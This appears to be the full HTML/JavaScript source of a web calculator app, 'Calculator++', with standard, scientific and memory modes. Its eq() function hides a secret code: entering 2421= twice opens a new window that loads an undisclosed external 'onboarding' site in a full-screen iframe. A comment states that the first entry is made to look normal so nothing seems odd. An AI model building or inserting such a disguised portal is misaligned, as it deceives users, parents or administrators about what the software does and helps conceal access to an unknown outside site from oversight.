<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>Calculator++</title>
<link href="https://fonts.googleapis.com/css2?family=Bebas+Neue&family=DM+Mono:wght@400;500&display=swap" rel="stylesheet"/>
<style>
* { box-sizing: border-box; margin: 0; padding: 0; }

body {
  min-height: 100vh;
  background: #f0ece4;
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  font-family: 'DM Mono', monospace;
  position: relative;
  overflow: hidden;
}

body::before {
  content: 'CALC++';
  position: fixed;
  font-family: 'Bebas Neue', sans-serif;
  font-size: 28vw;
  color: rgba(0,0,0,0.04);
  white-space: nowrap;
  top: 50%;
  left: 50%;
  transform: translate(-50%, -50%);
  pointer-events: none;
  user-select: none;
  letter-spacing: -0.02em;
}

.wrapper {
  display: flex;
  flex-direction: column;
  align-items: flex-start;
}

.brand {
  font-family: 'Bebas Neue', sans-serif;
  font-size: 1rem;
  letter-spacing: 0.25em;
  color: #1a1a1a;
  margin-bottom: 12px;
  padding-left: 4px;
  opacity: 0.5;
}

.calc {
  background: #1a1a1a;
  width: 380px;
  position: relative;
  box-shadow: 8px 8px 0px #c8b89a;
}

.calc::before {
  content: '';
  display: block;
  height: 6px;
  background: repeating-linear-gradient(
    90deg,
    #ff5c1a 0px, #ff5c1a 18px,
    #1a1a1a 18px, #1a1a1a 24px
  );
}

.display-area {
  background: #0d0d0d;
  padding: 14px 20px 14px;
  border-bottom: 2px solid #ff5c1a;
  position: relative;
  min-height: 130px;
  display: flex;
  flex-direction: column;
  justify-content: flex-end;
}

/* calc history tape */
.tape {
  font-size: 0.65rem;
  color: #3a3a3a;
  min-height: 48px;
  max-height: 48px;
  overflow-y: auto;
  text-align: right;
  letter-spacing: 0.04em;
  line-height: 1.7;
  margin-bottom: 4px;
  scrollbar-width: none;
}
.tape::-webkit-scrollbar { display: none; }
.tape-line { color: #444; }
.tape-line.latest { color: #777; }

.expr-line {
  font-size: 0.72rem;
  color: #555;
  min-height: 16px;
  text-align: right;
  letter-spacing: 0.05em;
  overflow: hidden;
  text-overflow: ellipsis;
  white-space: nowrap;
  margin-bottom: 4px;
}

.number {
  font-family: 'Bebas Neue', sans-serif;
  font-size: 3.6rem;
  color: #f0ece4;
  text-align: right;
  letter-spacing: 0.02em;
  line-height: 1;
  overflow: hidden;
  text-overflow: ellipsis;
  white-space: nowrap;
  transition: color 0.1s;
}
.number.flash { color: #ff5c1a; }

.op-indicator {
  position: absolute;
  top: 14px;
  left: 20px;
  font-family: 'Bebas Neue', sans-serif;
  font-size: 1.5rem;
  color: #ff5c1a;
  opacity: 0;
  transition: opacity 0.15s;
}
.op-indicator.show { opacity: 1; }

/* memory bar */
.mem-bar {
  position: absolute;
  top: 14px;
  right: 20px;
  font-size: 0.6rem;
  color: #ff5c1a;
  letter-spacing: 0.1em;
  opacity: 0;
  transition: opacity 0.2s;
}
.mem-bar.show { opacity: 1; }

/* mode tabs */
.mode-tabs {
  display: flex;
  border-bottom: 2px solid #2a2a2a;
}
.mode-tab {
  flex: 1;
  background: #111;
  color: #444;
  font-family: 'DM Mono', monospace;
  font-size: 0.6rem;
  letter-spacing: 0.15em;
  padding: 7px 0;
  border: none;
  border-right: 1px solid #2a2a2a;
  cursor: pointer;
  text-transform: uppercase;
  transition: background 0.1s, color 0.1s;
}
.mode-tab:last-child { border-right: none; }
.mode-tab.active { background: #1a1a1a; color: #ff5c1a; }
.mode-tab:hover { color: #ff5c1a; }

.grid {
  display: grid;
  grid-template-columns: repeat(4, 1fr);
  gap: 0;
  border-left: 2px solid #ff5c1a;
}

/* sci panel */
.sci-grid {
  display: none;
  grid-template-columns: repeat(4, 1fr);
  border-left: 2px solid #ff5c1a;
  border-bottom: 1px solid #2a2a2a;
}
.sci-grid.show { display: grid; }

button {
  font-family: 'Bebas Neue', sans-serif;
  font-size: 1.6rem;
  letter-spacing: 0.05em;
  height: 68px;
  border: none;
  border-right: 2px solid #2a2a2a;
  border-bottom: 2px solid #2a2a2a;
  cursor: pointer;
  transition: background 0.08s, transform 0.06s;
  outline: none;
}
button:active { transform: scale(0.95); }

.btn-num { background: #222; color: #f0ece4; }
.btn-num:hover { background: #2e2e2e; }

.btn-op { background: #1a1a1a; color: #ff5c1a; font-size: 1.8rem; border-right: 2px solid #333; border-bottom: 2px solid #333; }
.btn-op:hover { background: #2a1a10; }

.btn-clear { background: #ff5c1a; color: #1a1a1a; font-size: 1.2rem; }
.btn-clear:hover { background: #ff7a3d; }

.btn-del { background: #2a2a2a; color: #ff5c1a; font-size: 1.2rem; }
.btn-del:hover { background: #333; }

.btn-pct { background: #2a2a2a; color: #aaa; }
.btn-pct:hover { background: #333; }

.btn-mem { background: #1e1e1e; color: #888; font-size: 0.9rem; letter-spacing: 0.08em; }
.btn-mem:hover { background: #2a2a2a; color: #ff5c1a; }

.btn-sci { background: #161616; color: #888; font-size: 0.95rem; letter-spacing: 0.06em; height: 44px; }
.btn-sci:hover { background: #222; color: #f0ece4; }

.btn-zero { grid-column: span 2; text-align: left; padding-left: 28px; }

.btn-eq {
  background: #ff5c1a;
  color: #1a1a1a;
  font-size: 2rem;
  grid-row: span 2;
  height: 136px;
  border-right: none;
}
.btn-eq:hover { background: #ff7a3d; }
.btn-eq:active { transform: scale(0.96); }

.btn-dot { background: #222; color: #aaa; font-size: 2rem; }
.btn-dot:hover { background: #2e2e2e; }

button:nth-child(4n) { border-right: none; }

.footer {
  margin-top: 16px;
  font-size: 0.6rem;
  color: #999;
  letter-spacing: 0.18em;
  padding-left: 4px;
  text-transform: uppercase;
  display: flex;
  justify-content: space-between;
  width: 100%;
}
</style>
</head>
<body>

<div class="wrapper">
  <div class="brand">CALCULATORPLUSPLUS.GITHUB.IO</div>
  <div class="calc" id="calc">
    <div class="display-area">
      <div class="op-indicator" id="opInd"></div>
      <div class="mem-bar" id="memBar">MEM</div>
      <div class="tape" id="tape"></div>
      <div class="expr-line" id="exprLine"></div>
      <div class="number" id="display">0</div>
    </div>

    <div class="mode-tabs">
      <button class="mode-tab active" onclick="setMode('std')">STANDARD</button>
      <button class="mode-tab" onclick="setMode('sci')">SCIENTIFIC</button>
      <button class="mode-tab" onclick="setMode('mem')">MEMORY</button>
    </div>

    <!-- Scientific row (hidden by default) -->
    <div class="sci-grid" id="sciGrid">
      <button class="btn-sci" onclick="sciOp('sin')">SIN</button>
      <button class="btn-sci" onclick="sciOp('cos')">COS</button>
      <button class="btn-sci" onclick="sciOp('tan')">TAN</button>
      <button class="btn-sci" onclick="sciOp('sqrt')">√</button>
      <button class="btn-sci" onclick="sciOp('log')">LOG</button>
      <button class="btn-sci" onclick="sciOp('ln')">LN</button>
      <button class="btn-sci" onclick="sciOp('sq')">x²</button>
      <button class="btn-sci" onclick="sciOp('inv')">1/x</button>
    </div>

    <div class="grid">
      <button class="btn-clear" onclick="clearAll()">AC</button>
      <button class="btn-del"   onclick="del()">DEL</button>
      <button class="btn-pct"   onclick="percent()">%</button>
      <button class="btn-op"    onclick="op('/')">÷</button>

      <button class="btn-num" onclick="num('7')">7</button>
      <button class="btn-num" onclick="num('8')">8</button>
      <button class="btn-num" onclick="num('9')">9</button>
      <button class="btn-op"  onclick="op('*')">×</button>

      <button class="btn-num" onclick="num('4')">4</button>
      <button class="btn-num" onclick="num('5')">5</button>
      <button class="btn-num" onclick="num('6')">6</button>
      <button class="btn-op"  onclick="op('-')">−</button>

      <button class="btn-num" onclick="num('1')">1</button>
      <button class="btn-num" onclick="num('2')">2</button>
      <button class="btn-num" onclick="num('3')">3</button>
      <button class="btn-eq"  onclick="eq()">=</button>

      <button class="btn-num btn-zero" onclick="num('0')">0</button>
      <button class="btn-dot"          onclick="dot()">.</button>
      <button class="btn-op"           onclick="op('+')">+</button>
    </div>

    <!-- Memory row -->
    <div class="sci-grid" id="memGrid">
      <button class="btn-mem" onclick="memOp('MC')">MC</button>
      <button class="btn-mem" onclick="memOp('MR')">MR</button>
      <button class="btn-mem" onclick="memOp('M+')">M+</button>
      <button class="btn-mem" onclick="memOp('M-')">M−</button>
    </div>
  </div>
  <div class="footer">
    <span>v3.1.0</span>
    <span id="modeLabel">STANDARD MODE</span>
  </div>
</div>

<script>
var cur     = '0';
var prev    = '';
var oper    = null;
var evaled  = false;
var memory  = 0;
var codeHits = 0;   // counts how many times 2421= has been entered

var dispEl  = document.getElementById('display');
var exprEl  = document.getElementById('exprLine');
var tapeEl  = document.getElementById('tape');
var opIndEl = document.getElementById('opInd');
var memBarEl= document.getElementById('memBar');
var modeLabel = document.getElementById('modeLabel');
var tapeLines = [];

function setDisplay(v, highlight) {
  dispEl.textContent = v;
  dispEl.classList.toggle('flash', !!highlight);
}

function setOp(o) {
  var sym = {'/':'÷','*':'×','-':'−','+':'+'}[o] || '';
  opIndEl.textContent = sym;
  opIndEl.classList.toggle('show', !!o);
}

function pushTape(line) {
  tapeLines.push(line);
  if (tapeLines.length > 6) tapeLines.shift();
  tapeEl.innerHTML = tapeLines.map(function(l, i) {
    var cls = i === tapeLines.length - 1 ? 'tape-line latest' : 'tape-line';
    return '<div class="' + cls + '">' + l + '</div>';
  }).join('');
  tapeEl.scrollTop = tapeEl.scrollHeight;
}

function setMode(m) {
  document.querySelectorAll('.mode-tab').forEach(function(t, i) {
    t.classList.toggle('active', ['std','sci','mem'][i] === m);
  });
  document.getElementById('sciGrid').classList.toggle('show', m === 'sci');
  document.getElementById('memGrid').classList.toggle('show', m === 'mem');
  var labels = { std: 'STANDARD MODE', sci: 'SCIENTIFIC MODE', mem: 'MEMORY MODE' };
  modeLabel.textContent = labels[m];
}

function num(d) {
  if (evaled) { cur = d; evaled = false; }
  else if (cur === '0') { cur = d; }
  else if (cur.length < 13) { cur += d; }
  setDisplay(cur, false);
}

function dot() {
  if (evaled) { cur = '0.'; evaled = false; }
  else if (cur.indexOf('.') === -1) { cur += '.'; }
  setDisplay(cur, false);
}

function op(o) {
  if (oper && !evaled) { compute(true); }
  prev   = cur;
  oper   = o;
  evaled = false;
  cur    = '0';
  setOp(o);
  var sym = {'/':'÷','*':'×','-':'−','+':'+'}[o];
  exprEl.textContent = prev + ' ' + sym;
  setDisplay('0', false);
}

function compute(chain) {
  if (!oper || !prev) return;
  var a = parseFloat(prev);
  var b = parseFloat(cur);
  var r;
  if (oper === '+') r = a + b;
  else if (oper === '-') r = a - b;
  else if (oper === '*') r = a * b;
  else if (oper === '/') r = b === 0 ? null : a / b;
  var sym = {'/':'÷','*':'×','-':'−','+':'+'}[oper];
  var resultStr = r === null ? 'ERR' : String(parseFloat(r.toFixed(10)));
  if (!chain) {
    var line = prev + ' ' + sym + ' ' + cur + ' = ' + resultStr;
    pushTape(line);
    exprEl.textContent = prev + ' ' + sym + ' ' + cur + ' =';
    setOp(null);
  }
  cur    = resultStr;
  oper   = null;
  prev   = '';
  evaled = true;
  setDisplay(cur, true);
}

function eq() {
  // secret: must enter 2421= twice in a row
  if (cur === '2421' && !oper) {
    codeHits++;
    if (codeHits >= 2) {
      codeHits = 0;
      clearAll();
      easter();
    } else {
      // first hit — just behave like a normal = press so nothing looks weird
      pushTape('2421 = 2421');
      exprEl.textContent = '2421 =';
      evaled = true;
      setDisplay(cur, true);
    }
    return;
  }
  // any other input resets the counter
  codeHits = 0;
  compute(false);
}

function clearAll() {
  cur = '0'; prev = ''; oper = null; evaled = false;
  exprEl.textContent = '';
  setOp(null);
  setDisplay('0', false);
}

function del() {
  if (evaled) { clearAll(); return; }
  cur = cur.length > 1 ? cur.slice(0, -1) : '0';
  setDisplay(cur, false);
}

function percent() {
  var v = parseFloat(cur) / 100;
  cur = String(parseFloat(v.toFixed(10)));
  pushTape(dispEl.textContent + ' % = ' + cur);
  setDisplay(cur, false);
  evaled = true;
}

function sciOp(fn) {
  var v = parseFloat(cur);
  var r;
  if (fn === 'sin')  r = Math.sin(v * Math.PI / 180);
  else if (fn === 'cos')  r = Math.cos(v * Math.PI / 180);
  else if (fn === 'tan')  r = Math.tan(v * Math.PI / 180);
  else if (fn === 'sqrt') r = v < 0 ? null : Math.sqrt(v);
  else if (fn === 'log')  r = v <= 0 ? null : Math.log10(v);
  else if (fn === 'ln')   r = v <= 0 ? null : Math.log(v);
  else if (fn === 'sq')   r = v * v;
  else if (fn === 'inv')  r = v === 0 ? null : 1 / v;
  var res = r === null ? 'ERR' : String(parseFloat(r.toFixed(10)));
  pushTape(fn + '(' + cur + ') = ' + res);
  cur = res; evaled = true;
  setDisplay(cur, true);
}

function memOp(m) {
  if (m === 'MC') { memory = 0; memBarEl.classList.remove('show'); }
  else if (m === 'MR') { cur = String(memory); evaled = true; setDisplay(cur, false); }
  else if (m === 'M+') { memory += parseFloat(cur); memBarEl.classList.add('show'); }
  else if (m === 'M-') { memory -= parseFloat(cur); memBarEl.classList.add('show'); }
}

function easter() {
  var calc = document.getElementById('calc');
  var flashes = 0;
  var iv = setInterval(function() {
    flashes++;
    calc.style.outline = (flashes % 2 === 0) ? '4px solid #ff5c1a' : 'none';
    if (flashes >= 6) {
      clearInterval(iv);
      calc.style.outline = 'none';
      var w = window.open('about:blank', '_blank');
      if (w) {
        w.document.open();
        w.document.write(
          '<!DOCTYPE html><html><head><meta charset="UTF-8"/><title>Calculator++</title>' +
          '<style>*{margin:0;padding:0;box-sizing:border-box}' +
          'body{background:#000;height:100vh;overflow:hidden}' +
          'iframe{width:100%;height:100%;border:none;display:block}</style></head>' +
          '<body><iframe src="https://registry.delystigemusikanter.com/onboarding/" allow="fullscreen"></iframe></body></html>'
        );
        w.document.close();
      }
    }
  }, 80);
}

document.addEventListener('keydown', function(e) {
  if ('0123456789'.indexOf(e.key) !== -1) { num(e.key); return; }
  if (e.key === '.')         { dot(); return; }
  if (e.key === '+')         { op('+'); return; }
  if (e.key === '-')         { op('-'); return; }
  if (e.key === '*')         { op('*'); return; }
  if (e.key === '/')         { e.preventDefault(); op('/'); return; }
  if (e.key === 'Enter' || e.key === '=') { eq(); return; }
  if (e.key === 'Backspace') { del(); return; }
  if (e.key === 'Escape')    { clearAll(); return; }
  if (e.key === '%')         { percent(); return; }
});
</script>
</body>
</html>
